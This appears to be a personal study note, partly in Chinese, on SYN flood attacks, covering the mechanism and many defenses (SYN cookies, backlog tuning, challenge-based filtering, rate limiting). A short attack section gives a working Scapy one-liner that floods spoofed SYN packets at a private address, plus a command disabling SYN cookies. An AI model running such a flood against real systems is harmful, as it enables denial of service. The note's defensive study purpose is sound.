# SYN Flood Attack
A SYN flood attack is a form of denial-of-service attack in which an attacker rapidly initiates a connection to a server without finalizing the connection. 

The malicious client can either simply not send the expected `ACK`, or by spoofing the source IP address in the `SYN`, cause the server to send the `SYN-ACK` to a falsified IP address – which will not send an `ACK` because it "knows" that it never sent a `SYN`.[^wiki]

## Attack
1. Nmap 扫描可连接端口
2. `echo 0 > /proc/sys/net/ipv4/tcp_syncookies`
3. Scapy
   ```python
   send(IP(src=RandIP(), dst='10.0.0.8') / TCP(sport=RandShort(), dport=22, flags='S'), loop=1)
   ```

[ACK-PSH-RST-SYN Flood | Knowledge Base | MazeBolt](https://kb.mazebolt.com/knowledgebase/ack-psh-rst-syn-flood/)

## Defenses
 [^linoxide]
- Filtering

- Increasing backlog
  ```sh
  cat /proc/sys/net/ipv4/tcp_max_syn_backlog
  ```
  [linux - What is the difference between tcp\_max\_syn\_backlog and somaxconn? - Stack Overflow](https://stackoverflow.com/questions/62641621/what-is-the-difference-between-tcp-max-syn-backlog-and-somaxconn)

- Reducing SYN-RECEIVED timer
  ```sh
  cat /proc/sys/net/ipv4/tcp_synack_retries
  ```

- Recycling the oldest [half-open TCP](https://en.wikipedia.org/wiki/TCP_half-open "TCP half-open")

- SYN cache

- [SYN cookies](https://en.wikipedia.org/wiki/SYN_cookies)
  
  Instead of storing additional connections, a SYN queue entry is encoded into the **sequence number** sent in the `SYN-ACK` response. If the server then receives a subsequent `ACK` response from the client with the incremented sequence number, the server is able to reconstruct the SYN queue entry and proceed as usual with the connection.

  SYN cookies are now deployed in most major operating systems.
  
  ```sh
  cat /proc/sys/net/ipv4/tcp_syncookies
  ```

- Timestamping

  [network programming - What benefit is conferred by TCP timestamp? - Stack Overflow](https://stackoverflow.com/questions/7880383/what-benefit-is-conferred-by-tcp-timestamp)

  [Linux服务器收到SYN请求包没有回应ACK导致客户端无法建立TCP连接\_syn包不响应-CSDN博客](https://blog.csdn.net/zhaojie0708/article/details/90272978)

- Hybrid approaches

- Firewalls and proxies

- 耗时型

  会增大通讯耗时，一般只会在 SYN 频率超过阈值时启用。

  - 首包丢弃，检测是否重传 SYN
  - Error-seq: 伪造错误 SYN ACK，检测客户端是否 RST
  - Right-seq: 伪造 SYN ACK，检测服务端 RST 后客户端是否重连
    - 依赖客户端重试行为，破坏了 TCP 的可靠性
    - 云彩网络: 需要重连两次
  - 连接丢弃，检测客户端是否换端口重连

  [什么是SYN Flood？如何防御SYN Flood？ - 华为](https://info.support.huawei.com/info-finder/encyclopedia/zh/SYN+Flood.html)

- Rate limiting
  - SYN ratio: $SYN/(SYN+ACK)$
  - ACK ratio: $ACK/n$

[云彩网络](https://www.7yc.com/):
- 检测为攻击时会返回伪造的 SYN ACK，而不是忽略或 RST
- 当客户端发送 SYN ECN CWR 时，伪造的 SYN ACK 会包含 ECN CWR，而真实的 Windows SYN ACK 只会包含 ECN

  伪造的 SYN ACK window 为 8760，而真实的为 65535
- 伪造的 SYN ACK 不含 options，而真实的 Options: (12 bytes), Maximum segment size, No-Operation (NOP), Window scale, No-Operation (NOP), No-Operation (NOP), SACK permitted
- 伪造的 SYN ACK Conversation completeness 为 47，而真实的为 31

[网络层(TCP/UDP)攻击与防御原理 | 曹世宏的博客](https://cshihong.github.io/2019/05/14/%E7%BD%91%E7%BB%9C%E5%B1%82-TCP-UDP-%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%8E%9F%E7%90%86/)

[深入浅出DDoS攻击防御 - 知乎](https://www.zhihu.com/column/p/27128481)

[Windows 10 drops incoming TCP SYN packet for no reason - Microsoft Community](https://answers.microsoft.com/en-us/windows/forum/all/windows-10-drops-incoming-tcp-syn-packet-for-no/2245ca28-b82f-415a-8d4f-56afbf38b1a5?page=1)

## Reflection attack
[DRDoS预警：TCP反射的深度分析 - 百度安全社区](https://anquan.baidu.com/article/1360)

[基于中间盒的TCP反射放大攻击研究与实践分析 -- 绿盟科技技术博客](https://blog.nsfocus.net/tcp-use/)


[^wiki]: [SYN flood - Wikipedia](https://en.wikipedia.org/wiki/SYN_flood)
[^linoxide]: [What is SYN Flood Attack? Detection & Prevention in Linux](https://linoxide.com/snapshot-syn-flood-attack/)